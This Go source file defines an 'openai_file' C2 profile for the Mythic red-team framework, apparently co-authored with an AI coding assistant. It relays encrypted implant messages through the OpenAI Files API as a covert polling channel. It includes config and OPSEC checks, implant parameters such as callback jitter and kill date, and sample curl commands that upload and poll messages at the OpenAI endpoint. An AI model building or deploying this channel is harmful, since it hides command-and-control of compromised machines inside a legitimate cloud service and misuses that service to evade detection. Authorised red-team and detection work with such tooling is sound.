package c2functions

import (
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strings"

	c2structs "github.com/MythicMeta/MythicContainer/c2_structs"
	"github.com/MythicMeta/MythicContainer/logging"
)

const (
	version             = "0.1.0"
	profileName         = "openai_file"
	defaultBaseURL      = "https://api.openai.com/v1"
	defaultPurpose      = "batch"
	defaultChannelID    = "mythic"
	defaultRequestPref  = "mythic_to_server"
	defaultResponsePref = "mythic_to_agent"
)

type config struct {
	Instances []instanceConfig `json:"instances"`
}

type instanceConfig struct {
	Name                 string `json:"name"`
	APIKey               string `json:"api_key"`
	BaseURL              string `json:"base_url"`
	Organization         string `json:"organization"`
	Project              string `json:"project"`
	Purpose              string `json:"purpose"`
	ChannelID            string `json:"channel_id"`
	RequestPrefix        string `json:"request_prefix"`
	ResponsePrefix       string `json:"response_prefix"`
	TransportKey         string `json:"transport_key"`
	PollIntervalSeconds  int    `json:"poll_interval_seconds"`
	DeleteProcessedFiles bool   `json:"delete_processed_files"`
	Debug                bool   `json:"debug"`
	MaxFileBytes         int64  `json:"max_file_bytes"`
	MythicHost           string `json:"mythic_host"`
	MythicPort           int    `json:"mythic_port"`
}

func getC2JsonConfig() (*config, error) {
	currentConfig := config{}
	configBytes, err := os.ReadFile(filepath.Join(".", profileName, "c2_code", "config.json"))
	if err != nil {
		return nil, err
	}
	if err = json.Unmarshal(configBytes, &currentConfig); err != nil {
		logging.LogError(err, "failed to unmarshal config bytes")
		return nil, err
	}
	return &currentConfig, nil
}

var openAIFileC2Definition = c2structs.C2Profile{
	Name:             profileName,
	Author:           "@its_a_feature_ + Codex",
	Description:      "Uses encrypted JSONL files in the OpenAI Files API as a polling transport for Mythic messages.",
	IsP2p:            false,
	IsServerRouted:   true,
	SemVer:           version,
	ServerBinaryPath: filepath.Join(".", profileName, "c2_code", "mythic_openai_file_server"),
	ConfigCheckFunction: func(message c2structs.C2ConfigCheckMessage) c2structs.C2ConfigCheckMessageResponse {
		response := c2structs.C2ConfigCheckMessageResponse{Success: true}
		listenerConfig, err := getC2JsonConfig()
		if err != nil {
			response.Success = false
			response.Error = err.Error()
			return response
		}
		if len(listenerConfig.Instances) == 0 {
			response.Success = false
			response.Error = "no listener instances are configured"
			return response
		}
		payloadChannel := getStringParam(message.Parameters, "channel_id", defaultChannelID)
		payloadKey := getStringParam(message.Parameters, "transport_key", "")
		if payloadKey == "" || payloadKey == "REPLACE_ME" {
			response.Success = false
			response.Error = "transport_key must be set and must match the listener config"
			return response
		}

		matchingChannel := false
		configProblems := []string{}
		for _, instance := range listenerConfig.Instances {
			instanceChannel := defaultIfEmpty(instance.ChannelID, defaultChannelID)
			if instance.APIKey == "" || instance.APIKey == "REPLACE_ME" {
				configProblems = append(configProblems, fmt.Sprintf("instance %q is missing api_key", defaultIfEmpty(instance.Name, "default")))
			}
			if instance.TransportKey == "" || instance.TransportKey == "REPLACE_ME" {
				configProblems = append(configProblems, fmt.Sprintf("instance %q is missing transport_key", defaultIfEmpty(instance.Name, "default")))
			}
			if instanceChannel == payloadChannel {
				matchingChannel = true
			}
		}
		if len(configProblems) > 0 {
			response.Success = false
			response.Error = strings.Join(configProblems, "; ")
			return response
		}
		if !matchingChannel {
			response.Success = false
			response.Error = fmt.Sprintf("payload channel_id %q does not match any configured listener instance", payloadChannel)
			return response
		}
		response.Message = "OpenAI Files listener configuration looks usable"
		return response
	},
	GetRedirectorRulesFunction: func(message c2structs.C2GetRedirectorRuleMessage) c2structs.C2GetRedirectorRuleMessageResponse {
		return c2structs.C2GetRedirectorRuleMessageResponse{
			Success: true,
			Message: "No HTTP redirector rules are needed. Implants communicate with the OpenAI Files API directly.",
		}
	},
	OPSECCheckFunction: func(message c2structs.C2OPSECMessage) c2structs.C2OPSECMessageResponse {
		response := c2structs.C2OPSECMessageResponse{Success: true}
		transportKey := getStringParam(message.Parameters, "transport_key", "")
		channelID := getStringParam(message.Parameters, "channel_id", defaultChannelID)
		if transportKey == "" || transportKey == "REPLACE_ME" || strings.Contains(strings.ToLower(transportKey), "changeme") {
			response.Success = false
			response.Error = "transport_key is unset or still uses a placeholder"
			return response
		}
		if channelID == defaultChannelID {
			response.Message = "channel_id is still the default value; use a unique per-operation channel when possible"
			return response
		}
		response.Message = "No immediate issues with configuration"
		return response
	},
	GetIOCFunction: func(message c2structs.C2GetIOCMessage) c2structs.C2GetIOCMessageResponse {
		response := c2structs.C2GetIOCMessageResponse{Success: true}
		baseURL, err := message.GetStringArg("openai_base_url")
		if err != nil || baseURL == "" {
			baseURL = defaultBaseURL
		}
		channelID, err := message.GetStringArg("channel_id")
		if err != nil || channelID == "" {
			channelID = defaultChannelID
		}
		requestPrefix, err := message.GetStringArg("request_prefix")
		if err != nil || requestPrefix == "" {
			requestPrefix = defaultRequestPref
		}
		responsePrefix, err := message.GetStringArg("response_prefix")
		if err != nil || responsePrefix == "" {
			responsePrefix = defaultResponsePref
		}
		response.IOCs = append(response.IOCs,
			c2structs.IOC{Type: "url", IOC: strings.TrimRight(baseURL, "/") + "/files"},
			c2structs.IOC{Type: "filename", IOC: withTrailingUnderscore(requestPrefix) + sanitizeFilenamePart(channelID) + "_<request_id>.jsonl"},
			c2structs.IOC{Type: "filename", IOC: withTrailingUnderscore(responsePrefix) + sanitizeFilenamePart(channelID) + "_<request_id>.jsonl"},
		)
		return response
	},
	SampleMessageFunction: func(message c2structs.C2SampleMessageMessage) c2structs.C2SampleMessageResponse {
		response := c2structs.C2SampleMessageResponse{Success: true}
		baseURL := getStringParam(message.Parameters, "openai_base_url", defaultBaseURL)
		purpose := getStringParam(message.Parameters, "file_purpose", defaultPurpose)
		channelID := getStringParam(message.Parameters, "channel_id", defaultChannelID)
		requestPrefix := withTrailingUnderscore(getStringParam(message.Parameters, "request_prefix", defaultRequestPref))
		responsePrefix := withTrailingUnderscore(getStringParam(message.Parameters, "response_prefix", defaultResponsePref))
		requestID := "req_001"
		requestName := requestPrefix + sanitizeFilenamePart(channelID) + "_" + requestID + ".jsonl"
		responseName := responsePrefix + sanitizeFilenamePart(channelID) + "_" + requestID + ".jsonl"
		sampleEnvelope := fmt.Sprintf(`{"v":1,"profile":"%s","channel":"%s","direction":"request","id":"%s","alg":"aes-256-cbc-hmac-sha256+base64url","nonce":"BASE64URL_IV","ciphertext":"BASE64URL_CIPHERTEXT_PLUS_HMAC","created_at":0}`,
			profileName, channelID, requestID)
		baseURL = strings.TrimRight(baseURL, "/")
		response.Message = fmt.Sprintf(`REQUEST JSONL (%s):
%s

UPLOAD REQUEST:
curl -sS %s/files \
  -H "Authorization: Bearer $OPENAI_API_KEY" \
  -F purpose=%s \
  -F file=@%s

POLL RESPONSES:
curl -sS "%s/files?purpose=%s&order=asc" \
  -H "Authorization: Bearer $OPENAI_API_KEY"

EXPECTED RESPONSE FILENAME:
%s
`, requestName, sampleEnvelope, baseURL, purpose, requestName, baseURL, purpose, responseName)
		return response
	},
	HostFileFunction: func(message c2structs.C2HostFileMessage) c2structs.C2HostFileMessageResponse {
		return c2structs.C2HostFileMessageResponse{
			Success: false,
			Error:   "openai_file transports Mythic agent messages only; file hosting is not implemented in this profile",
		}
	},
}

var openAIFileC2Parameters = []c2structs.C2Parameter{
	{
		Name:          "openai_api_key",
		Description:   "OpenAI API key used by the implant to upload/list/download Files API JSONL envelopes",
		DefaultValue:  "",
		ParameterType: c2structs.C2_PARAMETER_TYPE_STRING,
		Required:      true,
		VerifierRegex: "^.+$",
	},
	{
		Name:          "openai_base_url",
		Description:   "OpenAI API base URL",
		DefaultValue:  defaultBaseURL,
		ParameterType: c2structs.C2_PARAMETER_TYPE_STRING,
		Required:      false,
		VerifierRegex: "^https?:\\/\\/.+",
	},
	{
		Name:          "openai_project",
		Description:   "Optional OpenAI-Project header value",
		DefaultValue:  "",
		ParameterType: c2structs.C2_PARAMETER_TYPE_STRING,
		Required:      false,
	},
	{
		Name:          "openai_organization",
		Description:   "Optional OpenAI-Organization header value",
		DefaultValue:  "",
		ParameterType: c2structs.C2_PARAMETER_TYPE_STRING,
		Required:      false,
	},
	{
		Name:          "file_purpose",
		Description:   "OpenAI Files API purpose; batch requires .jsonl files",
		DefaultValue:  defaultPurpose,
		ParameterType: c2structs.C2_PARAMETER_TYPE_CHOOSE_ONE,
		Required:      false,
		Choices:       []string{"batch"},
	},
	{
		Name:          "channel_id",
		Description:   "Shared channel tag used in OpenAI file names",
		DefaultValue:  defaultChannelID,
		ParameterType: c2structs.C2_PARAMETER_TYPE_STRING,
		Required:      true,
		VerifierRegex: "^[A-Za-z0-9_.-]+$",
	},
	{
		Name:          "request_prefix",
		Description:   "Filename prefix for implant-to-listener files",
		DefaultValue:  defaultRequestPref,
		ParameterType: c2structs.C2_PARAMETER_TYPE_STRING,
		Required:      false,
		VerifierRegex: "^[A-Za-z0-9_.-]+$",
	},
	{
		Name:          "response_prefix",
		Description:   "Filename prefix for listener-to-implant files",
		DefaultValue:  defaultResponsePref,
		ParameterType: c2structs.C2_PARAMETER_TYPE_STRING,
		Required:      false,
		VerifierRegex: "^[A-Za-z0-9_.-]+$",
	},
	{
		Name:          "transport_key",
		Description:   "Shared key for OpenAI Files JSONL envelope encryption; use base64:<32-byte-key> or a high-entropy passphrase",
		DefaultValue:  "REPLACE_ME",
		ParameterType: c2structs.C2_PARAMETER_TYPE_STRING,
		Required:      true,
		VerifierRegex: "^.{8,}$",
	},
	{
		Name:          "killdate",
		Description:   "Kill Date",
		DefaultValue:  365,
		ParameterType: c2structs.C2_PARAMETER_TYPE_DATE,
		Required:      false,
	},
	{
		Name:          "encrypted_exchange_check",
		Description:   "Perform Key Exchange",
		DefaultValue:  true,
		ParameterType: c2structs.C2_PARAMETER_TYPE_BOOLEAN,
		Required:      false,
	},
	{
		Name:          "AESPSK",
		Description:   "Mythic Message Encryption Type",
		DefaultValue:  "aes256_hmac",
		ParameterType: c2structs.C2_PARAMETER_TYPE_CHOOSE_ONE,
		Required:      false,
		IsCryptoType:  true,
		Choices:       []string{"aes256_hmac", "none"},
	},
	{
		Name:          "callback_interval",
		Description:   "Callback Interval in seconds",
		DefaultValue:  10,
		ParameterType: c2structs.C2_PARAMETER_TYPE_NUMBER,
		Required:      false,
		VerifierRegex: "^[0-9]+$",
	},
	{
		Name:          "callback_jitter",
		Description:   "Callback Jitter in percent",
		DefaultValue:  23,
		ParameterType: c2structs.C2_PARAMETER_TYPE_NUMBER,
		Required:      false,
		VerifierRegex: "^[0-9]+$",
	},
	{
		Name:          "proxy_host",
		Description:   "Proxy Host",
		DefaultValue:  "",
		ParameterType: c2structs.C2_PARAMETER_TYPE_STRING,
		Required:      false,
		VerifierRegex: "^$|^(http|https):\\/\\/[a-zA-Z0-9_.-]+",
	},
	{
		Name:          "proxy_port",
		Description:   "Proxy Port",
		DefaultValue:  "",
		ParameterType: c2structs.C2_PARAMETER_TYPE_STRING,
		Required:      false,
		VerifierRegex: "^$|^[0-9]+$",
	},
	{
		Name:          "proxy_user",
		Description:   "Proxy Username",
		DefaultValue:  "",
		ParameterType: c2structs.C2_PARAMETER_TYPE_STRING,
		Required:      false,
	},
	{
		Name:          "proxy_pass",
		Description:   "Proxy Password",
		DefaultValue:  "",
		ParameterType: c2structs.C2_PARAMETER_TYPE_STRING,
		Required:      false,
	},
}

func Initialize() {
	c2structs.AllC2Data.Get(profileName).AddC2Definition(openAIFileC2Definition)
	c2structs.AllC2Data.Get(profileName).AddIcon(filepath.Join(".", "openai_file.svg"))
	c2structs.AllC2Data.Get(profileName).AddParameters(openAIFileC2Parameters)
}

func getStringParam(params map[string]interface{}, name string, fallback string) string {
	value, ok := params[name]
	if !ok || value == nil {
		return fallback
	}
	if str, ok := value.(string); ok && str != "" {
		return str
	}
	return fallback
}

func defaultIfEmpty(value string, fallback string) string {
	if value == "" {
		return fallback
	}
	return value
}

func withTrailingUnderscore(value string) string {
	if value == "" {
		return ""
	}
	if strings.HasSuffix(value, "_") {
		return value
	}
	return value + "_"
}

func sanitizeFilenamePart(value string) string {
	var builder strings.Builder
	for _, r := range value {
		switch {
		case r >= 'a' && r <= 'z':
			builder.WriteRune(r)
		case r >= 'A' && r <= 'Z':
			builder.WriteRune(r)
		case r >= '0' && r <= '9':
			builder.WriteRune(r)
		case r == '_' || r == '-' || r == '.':
			builder.WriteRune(r)
		default:
			builder.WriteByte('_')
		}
	}
	cleaned := strings.Trim(builder.String(), "._-")
	if cleaned == "" {
		return "default"
	}
	return cleaned
}
